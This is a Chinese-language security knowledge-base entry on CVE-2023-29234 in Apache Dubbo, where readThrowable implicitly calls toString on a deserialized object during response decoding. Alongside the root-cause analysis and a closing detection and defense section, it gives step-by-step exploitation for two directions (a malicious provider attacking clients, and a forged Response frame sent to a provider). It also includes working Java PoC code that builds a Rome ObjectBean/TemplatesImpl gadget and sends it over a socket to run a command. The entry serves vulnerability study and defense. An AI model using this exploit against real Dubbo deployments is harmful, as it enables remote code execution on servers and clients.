---
id: web-java-deser-dubbo-readthrowable-implicit-tostring
title: Dubbo readThrowable 隐式 toString（CVE-2023-29234）：伪造 RESPONSE_WITH_EXCEPTION 在客户端/服务端触发 toString gadget
type: scenario
domain: web
path: web/java/deserialization
technique: dubbo-readthrowable-implicit-tostring
aliases:
- CVE-2023-29234
- Dubbo readThrowable toString
- ObjectInput.readThrowable 反序列化
- fake server 打 Dubbo 客户端
- 客户端发 Response 打服务端
- Dubbo 响应解码 gadget
tags:
- java
- dubbo
- deserialization
- tostring
- rpc
- gadget
- rce
cve:
- CVE-2023-29234
severity: critical
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
affected_versions: '>=3.1.0, <3.1.11；>=3.2.0, <3.2.5（图 28）'
verification:
  verified_by: verifier-V622
  verified_at: '2026-11-12T22:07:28+08:00'
  notes: 已对照原文与全部40张图核对：图28 受影响版本 >=3.1.0,<3.1.11；>=3.2.0,<3.2.5（原文图明确，库内 affected_versions 一致）；图29 git diff 把 readThrowable 异常拼接的 +obj 改为 +obj.getClass()；图30/33 RESPONSE_WITH_EXCEPTION→handleException→ObjectInput.readThrowable→obj.toString 调用链与运行时栈；图31 序列化 id 2/3/4/23/7(nativejava)；图32 协议由提供方指定；图34/35 3.1.5 getRequestData 无 future 返回 null 仍构造 DecodeableRpcResult；图36/37 mResult 非空且实现 Decodeable 继续解码；图38 3.1.10 getRequestData 抛 IllegalArgumentException；图39 message=null 提前返回。图40 控制台为 3.1.5 客户端打服务端，触发到 readThrowable 并调用 TemplatesImpl 相关 toString（截图显示 Rome ObjectBean.toString 内抛 Could not complete class ...TemplatesImpl.toString，未展示命令执行结果）。PoC 代码与原文一致。dedup 10候选均 related/new，与 hessian2-protocol-error-tostring-trigger（readObjectDefinition expect 拼接）触发点不同，非同链。未验证点：未实际搭建复现命令执行；fake server 方向仅原文文字与代码，无运行截图。
---

## 一句话结论

Dubbo 的 `ObjectInput.readThrowable` 在反序列化结果不是 Throwable 时，会把对象拼进异常消息（`"expect Throwable, but get " + obj`），隐式调用攻击者对象的 `toString()`；攻击者只需构造一个 `RESPONSE_WITH_EXCEPTION` 响应帧（用 Rome `ObjectBean` 包 `TemplatesImpl` 等 toString gadget），无论作为 fake server 打客户端，还是作为客户端向服务端发送伪造 Response，都能在解码响应时触发 RCE（CVE-2023-29234）。

## 原理

- **缺陷点**：`ObjectInput.readThrowable()` 默认实现 `Object obj = readObject(); if (!(obj instanceof Throwable)) throw new IOException("Response data error, expect Throwable, but get " + obj);`。Java 字符串拼接会调用 `obj.toString()`，于是“类型校验失败”的分支本身成了 gadget 触发点。官方修复把 `+ obj` 改为 `+ obj.getClass()`，不再调用 `toString`。
- **调用链**：`DecodeableRpcResult.decode` 读出响应标志字节，`case RESPONSE_WITH_EXCEPTION: handleException(in)` → `in.readThrowable()` → `obj.toString()`。`DecodeableRpcResult` 用于消费者解码 provider 返回的响应，但 Dubbo 并未限制“谁”能发送 Response 帧。
- **方向一（fake server → 客户端）**：Dubbo 协议/序列化方式由服务方决定，攻击者可搭建恶意 provider（或 MITM）诱导客户端连接；重写 `DubboCodec.encodeResponseData`，把原本的 `Throwable` 替换为任意可序列化的 toString gadget（如 Rome `ObjectBean(Templates.class, TemplatesImpl)`），并配置 `serialization="nativejava"`，客户端 `readThrowable` 的 `readObject` 先完成反序列化，随后拼接消息触发 `toString`。
- **方向二（客户端 → 服务端）**：攻击者直接向 provider 端口发送一个 Response 帧。3.1.5 中 `DubboCodec.decodeBody` 用 `getRequestData(id, proto)` 取 invocation，取不到时返回 null，但 `DecodeableRpcResult` 仍被构造并赋给 `res.mResult`，后续 decode 时 `mResult` 非 null 且实现 `Decodeable`，继续走到 `handleException→readThrowable→toString`；3.1.10 改为 `getRequestData(channel, response, id)`，无匹配 future 时直接抛 `IllegalArgumentException`，`mResult` 为 null，`decode(null)` 提前返回，因此不触发——这就是同一 payload 在 3.1.5 可用、3.1.10 不可用的原因。
- **为什么成立**：解码响应属于预认证处理（发生在业务鉴权之前），且“非 Throwable”这一错误路径反而保证对象被反序列化并调用 toString；黑名单只覆盖部分类，Rome ObjectBean 等常用库仍在 classpath。

## 触发条件

- Dubbo 版本 >=3.1.0,<3.1.11 或 >=3.2.0,<3.2.5（原文图 28 的受影响区间；3.1.5 实测可利用，3.1.10 客户端打服务端不可用）。
- 攻击者能作为服务端被客户端连接（内网 MITM/DNS 劫持/恶意注册中心下发 provider 地址），或能直接访问 Dubbo provider 端口发送伪造 Response。
- 目标 classpath 含可用的 toString gadget（Rome、TemplatesImpl 等）。
- 响应帧的序列化 id 可以是 nativejava（id 7）等，客户端按头部选择反序列化方式。

## 利用步骤

1. 选择方向：
   - fake server：启动恶意 Dubbo provider，协议配置 `serialization="nativejava"`，重写 `encodeResponseData`，把响应体写成 `RESPONSE_WITH_EXCEPTION` + gadget 对象；
   - 客户端打服务端：直接向 provider 端口（如 20880）发送构造好的 Response 帧。
2. 构造 gadget：`Gadgets.createTemplatesImpl(cmd)` 得到 TemplatesImpl，再包 `new ObjectBean(Templates.class, templatesImpl)`，其 toString 链会触发 TemplatesImpl 字节码执行。
3. 发送帧：header 设 MAGIC、serialization id（7=nativejava）、`Response.OK`、id=1，body 写 `RESPONSE_WITH_EXCEPTION` 后 `writeObject(gadget)`。
4. 目标 `DecodeableRpcResult.decode → handleException → readThrowable` 反序列化并 `toString`，执行命令。
5. 若 3.1.10+ 客户端打服务端无效，改用 fake server 方向或寻找其他 patch 差异点。

## PoC

原文 3.1.5 客户端打服务端的核心代码（删去无关行）：

```java
ByteArrayOutputStream boos = new ByteArrayOutputStream();
ByteArrayOutputStream nativeJavaBoos = new ByteArrayOutputStream();
Serialization serialization = new NativeJavaSerialization();
NativeJavaObjectOutput out = new NativeJavaObjectOutput(nativeJavaBoos);

byte[] header = new byte[HEADER_LENGTH];
Bytes.short2bytes(MAGIC, header);
header[2] = serialization.getContentTypeId(); // nativejava
header[3] = Response.OK;
Bytes.long2bytes(1, header, 4);

Object exp = getThrowablePayload("open -a calculator"); // 任意 toString gadget
out.writeByte(RESPONSE_WITH_EXCEPTION);
out.writeObject(exp); // 关键：未用 writeThrowable
out.flushBuffer();

Bytes.int2bytes(nativeJavaBoos.size(), header, 12);
boos.write(header);
boos.write(nativeJavaBoos.toByteArray());

Socket socket = new Socket("127.0.0.1", 20880);
socket.getOutputStream().write(boos.toByteArray());
```

```java
protected static Object getThrowablePayload(String command) throws Exception {
    Object o = Gadgets.createTemplatesImpl(command);      // TemplatesImpl
    ObjectBean delegate = new ObjectBean(Templates.class, o);
    return delegate;                                      // toString → TemplatesImpl
}
```

fake server 方向只需在服务端 `encodeResponseData` 中用同样的 gadget 替换 `result.getException()`，并令 `out.writeObject(th)`。

## 变体与关联

- 变体：toString 链可换成任意该 classpath 可用的 gadget（JNDI 型、TemplatesImpl 型）；序列化方式也可用 hessian2 等（是否可序列化 gadget 取决于协议）。
- 关联：[[web-java-deser-rome-objectbean-jdbcrowset-jndi]]、[[web-java-deser-rome-equalsbean-tostringbean-templatesimpl]]（Rome toString 链）、[[web-java-deser-hessian2-protocol-error-tostring-trigger]]（另一处“错误路径隐式 toString”触发）、[[web-java-deser-hessian-dubbo-provider-argument-deserialization-rce]]（Dubbo 请求方向的反序列化入口）。
- 边界：修复版本改用 `obj.getClass()`；3.1.10+ 的服务端在无匹配请求时无法构造 `DecodeableRpcResult`；classpath 无可用 gadget 或无法控制序列化方式时利用受限。

## 检测与防御

- 升级到 3.1.11/3.2.5 及以上；Dubbo 端口不暴露公网，启用鉴权与 TLS。
- 服务端：拒绝/丢弃无匹配 invocation 的 Response 帧；客户端：固定 provider 地址与序列化方式，不信任注册中心下发的任意 provider。
- 检测：Dubbo 响应解码异常日志 `Response data error, expect Throwable, but get ...`；异常栈中出现 `ObjectInput.readThrowable` 且伴随类加载/`TemplatesImpl`/JNDI 相关调用；nativejava（id 7）序列化流量异常。
- 防御：classpath 清理不必要的 gadget 库；在 RPC 网关按序列化 id 与类名做白名单；对客户端与 provider 之间做双向认证。
